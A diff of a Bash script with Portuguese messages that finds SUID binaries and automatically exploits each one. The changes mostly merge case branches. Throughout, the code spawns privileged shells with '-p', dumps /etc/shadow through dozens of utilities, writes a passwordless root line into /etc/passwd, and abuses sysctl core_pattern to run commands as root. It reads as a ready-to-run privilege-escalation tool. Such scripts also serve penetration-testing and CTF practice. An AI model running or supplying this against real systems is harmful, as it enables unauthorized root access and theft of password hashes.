@@ -22,12 +22,12 @@ for path in $SUIDS; do
     bin=$(basename "$path")
 
     case "$bin" in
-        bash)
-            echo "[+] $path → BASH SUID encontrado! Teste:"
+        bash|dash|ksh)
+            echo "[+] $path → SUID encontrado! Teste:"
             "$path" -p
             ;;
-        aa-exec)
-            echo "[+] $path → aa-exec SUID encontrado!"
+        aa-exec|distcc|env|ionice|ld.so|multitime|nice|pexec|softlimit|sshpassb|time)
+            echo "[+] $path → SUID encontrado!"
             "$path" /bin/sh -p
             ;;
         ab)
@@ -70,8 +70,8 @@ for path in $SUIDS; do
             echo "[+] $path → arp SUID encontrado! Teste:"
             "$path" -v -f /etc/shadow
             ;;
-        as)
-            echo "[+] $path → as SUID encontrado! Teste:"
+        as|nm)
+            echo "[+] $path → SUID encontrado! Teste:"
             LFILE=/etc/shadow
             "$path" @$LFILE
             ;;
@@ -79,39 +79,31 @@ for path in $SUIDS; do
             echo "[+] $path → ascii-xfr SUID encontrado! Teste:"
             "$path" -ns /etc/shadow
             ;;
-        ash)
-            echo "[+] $path → ash SUID encontrado! Teste:"
+        ash|elvish|fish|sash|vigr|vipw|yash|zsh)
+            echo "[+] $path → SUID encontrado! Teste:"
             "$path" 
             ;;
-        aspell)
-            echo "[+] $path → aspell SUID encontrado! Teste:"
+        aspell|mosquitto)
+            echo "[+] $path → SUID encontrado! Teste:"
             "$path" -c /etc/shadow
             ;;
         atobm)
             echo "[+] $path → atobm SUID encontrado! Teste:"
             "$path" /etc/shadow 2>&1 | awk -F "'" '{printf "%s", $2}'
             ;;
-        awk)
-            echo "[+] $path → awk SUID encontrado! Teste:"
+        awk|mawk|nawk)
+            echo "[+] $path → SUID encontrado! Teste:"
             "$path" '//' /etc/shadow
             "$path" 'BEGIN {system("/bin/sh")}'
             id
             ;;
-        base32)
-            echo "[+] $path → base32 SUID encontrado! Teste:"
-            "$path" /etc/shadow | "$path" --decode
-            ;;
-        base64)
-            echo "[+] $path → base64 SUID encontrado! Teste:"
+        base32|base64|basez)
+            echo "[+] $path → SUID encontrado! Teste:"
             "$path" /etc/shadow | "$path" --decode
             ;;
         basenc)
             echo "[+] $path → basenc SUID encontrado! Teste:"
             "$path" --base64 /etc/shadow | "$path" -d --base64
-            ;;
-        basez)
-            echo "[+] $path → basez SUID encontrado! Teste:"
-            "$path" /etc/shadow | "$path" --decode
             ;;
         bc)
             echo "[+] $path → bc SUID encontrado! Teste:"
@@ -130,7 +122,7 @@ for path in $SUIDS; do
             echo "[+] $path → busybox SUID encontrado! Teste:"
             "$path" sh
             ;;
-        bzip2)
+        bzip2|xz)
             echo "[+] $path → bzip2 SUID encontrado! Teste:"
             "$path" -c /etc/shadow | "$path" -d
             ;;
@@ -142,8 +134,8 @@ for path in $SUIDS; do
             echo "[+] $path → capsh SUID encontrado! Teste:"
             "$path" --gid=0 --uid=0 --
             ;;
-        cat)
-            echo "[+] $path → cat SUID encontrado! Teste:"
+        cat|column|eqn|expand|hd|less|links|more|paste|pg|soelim|strings|tbl|troff|ul|uniq|xmore|zsoelim)
+            echo "[+] $path → SUID encontrado! Teste:"
             "$path" /etc/shadow
             ;;
         chmod)
@@ -176,10 +168,6 @@ for path in $SUIDS; do
             echo "[+] $path → cmp SUID encontrado! Teste:"
             "$path" /etc/shadow /dev/zero -b -l
             ;;
-        column)
-            echo "[+] $path → column SUID encontrado! Teste:"
-            "$path" /etc/shadow
-            ;;
         comm)
             echo "[+] $path → comm SUID encontrado! Teste:"
             "$path" /etc/shadow /dev/null 2>/dev/null
@@ -189,7 +177,7 @@ for path in $SUIDS; do
             echo "gtfobins.github.io/gtfobins/cp/"
             ;;
         cpio)
-            echo "[+] $path → cpio SUID encontrado! Teste:"
+            echo "[+] $path → cpio SUID encontrado! Teste (existem duas tecnicas):"
             LFILE=/etc/shadow
             TF=$(mktemp -d)
             echo "$LFILE" | "$path" -R $UID -dp $TF
@@ -226,11 +214,7 @@ for path in $SUIDS; do
             echo "[+] $path → cut SUID encontrado! Teste:"
             "$path" -d "" -f1 /etc/shadow
             ;;
-        dash)
-            echo "[+] $path → dash SUID encontrado! Teste:"
-            "$path" -p
-            ;;
-        date)
+        date|dig|file|nft|ssh-keyscan)
             echo "[+] $path → date SUID encontrado! Teste:"
             "$path" -f /etc/shadow
             ;;
@@ -250,14 +234,6 @@ for path in $SUIDS; do
         diff)
             echo "[+] $path → diff SUID encontrado! Teste:"
             "$path" --line-format=%L /dev/null /etc/shadow
-            ;;
-        dig)
-            echo "[+] $path → dig SUID encontrado! Teste:"
-            "$path" -f /etc/shadow
-            ;;
-        distcc)
-            echo "[+] $path → distcc SUID encontrado! Teste:"
-            "$path" /bin/sh -p
             ;;
         dmsetup)
             echo "[+] $path → dmsetup SUID encontrado! Teste:"
@@ -285,45 +261,21 @@ for path in $SUIDS; do
             echo "[+] $path → efax SUID encontrado! Teste:"
             "$path" -d /etc/shadow
             ;;
-        elvish)
-            echo "[+] $path → elvish SUID encontrado! Teste:"
-            "$path"
-            ;;
         emacs)
             echo "[+] $path → emacs SUID encontrado! Teste:"
             "$path" -Q -nw --eval '(term "/bin/sh -p")'
             ;;
-        env)
-            echo "[+] $path → env SUID encontrado! Teste:"
-            "$path" /bin/sh -p
-            ;;
-        eqn)
-            echo "[+] $path → eqn SUID encontrado! Teste:"
-            "$path" /etc/shadow
-            ;;        
-        espeak)
+         espeak)
             echo "[+] $path → espeak SUID encontrado! Teste:"
             "$path" -qXf /etc/shadow
-            ;;
-        expand)
-            echo "[+] $path → expand SUID encontrado! Teste:"
-            "$path" /etc/shadow
             ;;
         expect)
             echo "[+] $path → expect SUID encontrado! Teste:"
             "$path" -c 'spawn /bin/sh -p;interact'
             ;;
-        file)
-            echo "[+] $path → file SUID encontrado! Teste:"
-            "$path" -f /etc/shadow
-            ;;
         find)
             echo "[+] $path → find SUID encontrado! Teste:"
             "$path" . -exec /bin/sh -p \; -quit
-            ;;
-        fish)
-            echo "[+] $path → fish SUID encontrado! Teste:"
-            "$path"
             ;;
         flock)
             echo "[+] $path → flock SUID encontrado! Teste:"
@@ -362,7 +314,7 @@ for path in $SUIDS; do
             echo "[+] $path → gimp SUID encontrado! Teste:"
             "$path" -idf --batch-interpreter=python-fu-eval -b 'import os; os.execl("/bin/sh", "sh", "-p")'
             ;;
-        grep)
+        grep|look)
             echo "[+] $path → grep SUID encontrado! Teste:"
             "$path" '' /etc/shadow
             ;;
@@ -378,16 +330,12 @@ for path in $SUIDS; do
             echo "[+] $path → gzip SUID encontrado! Teste:"
             "$path" -f /etc/shadow -t
             ;;
-        hd)
-            echo "[+] $path → hd SUID encontrado! Teste:"
-            "$path" /etc/shadow
-            ;;
-        head)
+        head|tail)
             echo "[+] $path → head SUID encontrado! Teste:"
             "$path" -c1G /etc/shadow
             ;;
-        hexdump)
-            echo "[+] $path → hexdump SUID encontrado! Teste:"
+        hexdump|tic)
+            echo "[+] $path → SUID encontrado! Teste:"
             "$path" -C /etc/shadow
             ;;        
         highlight)
@@ -407,10 +355,6 @@ for path in $SUIDS; do
             echo "[+] $path → install SUID encontrado! Teste:"
             "$path" -o root -g root -m 6777 /bin/bash ./suidbash
             ./suidbash -p
-            ;;
-        ionice)
-            echo "[+] $path → ionice SUID encontrado! Teste:"
-            "$path" /bin/sh -p
             ;;
         ip)
             echo "[+] $path → ip SUID encontrado! Teste:"
@@ -441,10 +385,6 @@ for path in $SUIDS; do
             echo "[+] $path → julia SUID encontrado! Teste:"
             "$path" -e 'run(`/bin/sh -p`)'
             ;;
-        ksh)
-            echo "[+] $path → ksh SUID encontrado! Teste:"
-            "$path" -p
-            ;;
         ksshell)
             echo "[+] $path → ksshell SUID encontrado! Teste:"
             "$path" -i /etc/shadow
@@ -455,25 +395,9 @@ for path in $SUIDS; do
             echo "./kubectl proxy --address=0.0.0.0 --port=4444 --www=$LFILE --www-prefix=/x/"
             echo "Acesse o arquivo com curl http://127.0.0.1:444/x/shadow"            
             ;;
-        ld.so)
-            echo "[+] $path → ld.so SUID encontrado! Teste:"
-            "$path" /bin/sh -p
-            ;;
-        less)
-            echo "[+] $path → less SUID encontrado! Teste:"
-            "$path" /etc/shadow
-            ;;
-        links)
-            echo "[+] $path → links SUID encontrado! Teste:"
-            "$path" /etc/shadow
-            ;;
         logsave)
             echo "[+] $path → logsave SUID encontrado! Teste:"
             "$path" /dev/null /bin/sh -i -p
-            ;;
-        look)
-            echo "[+] $path → look SUID encontrado! Teste:"
-            "$path" '' /etc/shadow
             ;;
         lua)
             echo "[+] $path → lua SUID encontrado! Teste:"
@@ -484,32 +408,12 @@ for path in $SUIDS; do
             cmd='/bin/sh -p'
             "$path" -s --eval=$'x:\n\t-'"$cmd"
             ;;
-        mawk)
-            echo "[+] $path → mawk SUID encontrado! Teste:"
-            "$path" '//' /etc/shadow
-            ;;
         minicom)
             echo "[+] $path → minicom SUID encontrado! Teste:"
             "$path" -D /dev/null
             ;;
-        more)
-            echo "[+] $path → more SUID encontrado! Teste:"
-            "$path" /etc/shadow
-            ;;
-        mosquitto)
-            echo "[+] $path → mosquitto SUID encontrado! Teste:"
-            "$path" -c /etc/shadow
-            ;;
-        msgattrib)
+        msgattrib|msgcat|msgconv|msguniq)
             echo "[+] $path → msgattrib SUID encontrado! Teste:"
-            "$path" -P /etc/shadow
-            ;;
-        msgcat)
-            echo "[+] $path → msgcat SUID encontrado! Teste:"
-            "$path" -P /etc/shadow
-            ;;
-        msgconv)
-            echo "[+] $path → msgconv SUID encontrado! Teste:"
             "$path" -P /etc/shadow
             ;;
         msgfilter)
@@ -519,14 +423,6 @@ for path in $SUIDS; do
         msgmerge)
             echo "[+] $path → msgmerge SUID encontrado! Teste:"
             "$path" -P /etc/shadow /dev/null
-            ;;
-        msguniq)
-            echo "[+] $path → msguniq SUID encontrado! Teste:"
-            "$path" -P /etc/shadow
-            ;;
-        multitime)
-            echo "[+] $path → multitime SUID encontrado! Teste:"
-            "$path" /bin/sh -p
             ;;
         mv)
             echo "[+] $path → mv SUID encontrado! Teste zerar a senha do root:"
@@ -539,31 +435,14 @@ for path in $SUIDS; do
             echo "[+] $path → nasm SUID encontrado! Teste:"
             "$path" -@ /etc/shadow
             ;;
-        nawk)
-            echo "[+] $path → nawk SUID encontrado! Teste:"
-            "$path" '//' /etc/shadow
-            ;;
         ncftp)
             echo "[+] $path → ncftp SUID encontrado! Teste:"
             "$path"
             !/bin/sh -p
             ;;
-        nft)
-            echo "[+] $path → nft SUID encontrado! Teste:"
-            "$path" -f /etc/shadow
-            ;;
-        nice)
-            echo "[+] $path → nice SUID encontrado! Teste:"
-            "$path" /bin/sh -p
-            ;;
         nl)
             echo "[+] $path → nl SUID encontrado! Teste:"
             "$path" -bn -w1 -s '' /etc/shadow
-            ;;
-        nm)
-            echo "[+] $path → nm SUID encontrado! Teste:"
-            LFILE=/etc/shadow
-            "$path" @$LFILE
             ;;
         nmap)
             echo "[+] $path → nmap SUID encontrado! Teste:"
@@ -605,10 +484,6 @@ for path in $SUIDS; do
             echo "[+] LFILE=file_to_write"
             echo "[+] echo DATA | ./pandoc -t plain -o "$LFILE""
             ;;
-        paste)
-            echo "[+] $path → paste SUID encontrado! Teste:"
-            "$path" /etc/shadow
-            ;;
         perf)
             echo "[+] $path → perf SUID encontrado! Teste:"
             "$path" stat /bin/sh -p
@@ -616,14 +491,6 @@ for path in $SUIDS; do
         perl)
             echo "[+] $path → perl SUID encontrado! Teste:"
             "$path" -e 'exec "/bin/sh";'
-            ;;
-        pexec)
-            echo "[+] $path → pexec SUID encontrado! Teste:"
-            "$path" /bin/sh -p
-            ;;
-        pg)
-            echo "[+] $path → pg SUID encontrado! Teste:"
-            "$path" /etc/shadow
             ;;
         php)
             echo "[+] $path → php SUID encontrado! Teste:"
@@ -685,17 +552,9 @@ for path in $SUIDS; do
             echo "[+] $path → run-parts SUID encontrado! Teste:"
             "$path" --new-session --regex '^sh$' /bin --arg='-p'
             ;;
-        rview)
-            echo "[+] $path → rview SUID encontrado! Teste:"
+        rview|rvim|view|vim|vimdiff)
+            echo "[+] $path → SUID encontrado! Teste:"
             "$path" -c ':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'
-            ;;
-        rvim)
-            echo "[+] $path → rvim SUID encontrado! Teste:"
-            "$path" -c ':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'
-            ;;
-        sash)
-            echo "[+] $path → sash SUID encontrado! Teste:"
-            "$path"
             ;;
         scanmem)
             echo "[+] $path → scanmem SUID encontrado! Teste:"
@@ -724,14 +583,6 @@ for path in $SUIDS; do
             echo "LFILE=file_to_write"
             echo "shuf -e DATA -o "$LFILE""
             ;;
-        soelim)
-            echo "[+] $path → soelim SUID encontrado! Teste:"
-            "$path" /etc/shadow
-            ;;
-        softlimit)
-            echo "[+] $path → softlimit SUID encontrado! Teste:"
-            "$path" /bin/sh -p
-            ;;
         sort)
             echo "[+] $path → sort SUID encontrado! Teste:"
             "$path" -m /etc/shadow
@@ -757,14 +608,6 @@ EOF
             echo "[+] $path → ssh-keygen SUID encontrado! Teste:"
             "$path" -D ./lib.so
             ;;
-        ssh-keyscan)
-            echo "[+] $path → ssh-keyscan SUID encontrado! Teste:"
-            "$path" -f /etc/shadow
-            ;;
-        sshpassb)
-            echo "[+] $path → sshpass SUID encontrado! Teste:"
-            "$path" /bin/sh -p
-            ;;
         start-stop-daemon)
             echo "[+] $path → start-stop-daemon SUID encontrado! Teste:"
             "$path" -n $RANDOM -S -x /bin/sh -- -p
@@ -777,14 +620,10 @@ EOF
             echo "[+] $path → strace SUID encontrado! Teste:"
             "$path" -o /dev/null /bin/sh -p
             ;;
-        strings)
-            echo "[+] $path → strings SUID encontrado! Teste:"
-            "$path" /etc/shadow
-            ;;
         sysctl)
             echo "[+] $path → sysctl SUID encontrado! Teste:"
             cmd='/bin/sh -c id>/tmp/id'
-            ./sysctl "kernel.core_pattern=|$cmd"
+            "$path" "kernel.core_pattern=|$cmd"
             sleep 9999 &
             kill -QUIT $!
             cat /tmp/id
@@ -805,17 +644,9 @@ EOF
             echo "[+] $path → tac SUID encontrado! Teste:"
             "$path" -s 'RANDOM' /etc/shadow
             ;;
-        tail)
-            echo "[+] $path → tail SUID encontrado! Teste:"
-            "$path" -c1G /etc/shadow
-            ;;
         taskset)
             echo "[+] $path → taskset SUID encontrado! Teste:"
             "$path" 1 /bin/sh -p
-            ;;
-        tbl)
-            echo "[+] $path → tbl SUID encontrado! Teste:"
-            "$path" /etc/shadow
             ;;
         tclsh)
             echo "[+] $path → tclsh SUID encontrado! Teste:"
@@ -838,33 +669,13 @@ EOF
             echo "./tftp $RHOST"
             echo "put file_to_send"
             ;;
-        tic)
-            echo "[+] $path → tic SUID encontrado! Teste:"
-            "$path" -C /etc/shadow
-            ;;
-        time)
-            echo "[+] $path → time SUID encontrado! Teste:"
-            "$path" /bin/sh -p
-            ;;
         timeout)
             echo "[+] $path → timeout SUID encontrado! Teste:"
             "$path" 7d /bin/sh -p
             ;;
-        troff)
-            echo "[+] $path → troff SUID encontrado! Teste:"
-            "$path" /etc/shadow
-            ;;
-        ul)
-            echo "[+] $path → ul SUID encontrado! Teste:"
-            "$path" /etc/shadow
-            ;;
         unexpand)
             echo "[+] $path → unexpand SUID encontrado! Teste:"
             "$path" -t99999999 /etc/shadow
-            ;;
-        uniq)
-            echo "[+] $path → uniq SUID encontrado! Teste:"
-            "$path" /etc/shadow
             ;;
         unshare)
             echo "[+] $path → unshare SUID encontrado! Teste:"
@@ -887,12 +698,8 @@ EOF
             echo "echo DATA >$TF"
             echo "update-alternatives --force --install "$LFILE" x "$TF" 0"
             ;;
-        uudecode)
-            echo "[+] $path → uudecode SUID encontrado! Teste:"
-            "$path" /etc/shadow /dev/stdout | "$path"
-            ;;
-        uuencode)
-            echo "[+] $path → uuencode SUID encontrado! Teste:"
+        uudecode|uuencode)
+            echo "[+] $path → SUID encontrado! Teste:"
             "$path" /etc/shadow /dev/stdout | "$path"
             ;;
         vagrant)
@@ -908,26 +715,6 @@ EOF
             LFILE=/etc/passwd
             "$path" -g request -q 'ReqURL ~ "/xxx"' -F 'root::0:0:root:/root:/bin/bash' -w "$LFILE"
             su root
-            ;;
-        view)
-            echo "[+] $path → view SUID encontrado! Teste:"
-            "$path" -c ':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'
-            ;;
-        vigr)
-            echo "[+] $path → vigr SUID encontrado! Teste:"
-            "$path"
-            ;;
-        vim)
-            echo "[+] $path → vim SUID encontrado! Teste:"
-            "$path" -c ':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'
-            ;;
-        vimdiff)
-            echo "[+] $path → vimdiff SUID encontrado! Teste:"
-            "$path" -c ':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'
-            ;;
-        vipw)
-            echo "[+] $path → vipw SUID encontrado! Teste:"
-            "$path"
             ;;
         w3m)
             echo "[+] $path → w3m SUID encontrado! Teste:"
@@ -964,29 +751,9 @@ EOF
             echo "[+] $path → xmodmap SUID encontrado! Teste:"
             "$path" -v /etc/shadow
             ;;
-        xmore)
-            echo "[+] $path → xmore SUID encontrado! Teste:"
-            "$path" /etc/shadow
-            ;;
         xxd)
             echo "[+] $path → xxd SUID encontrado! Teste:"
             "$path" /etc/shadow | "$path" -r
-            ;;
-        xz)
-            echo "[+] $path → xz SUID encontrado! Teste:"
-            "$path" -c /etc/shadow | "$path" -d
-            ;;
-        yash)
-            echo "[+] $path → yash SUID encontrado! Teste:"
-            "$path"
-            ;;
-        zsh)
-            echo "[+] $path → zsh SUID encontrado! Teste:"
-            "$path"
-            ;;
-        zsoelim)
-            echo "[+] $path → zsoelim SUID encontrado! Teste:"
-            "$path" /etc/shadow
             ;;
 
         *)
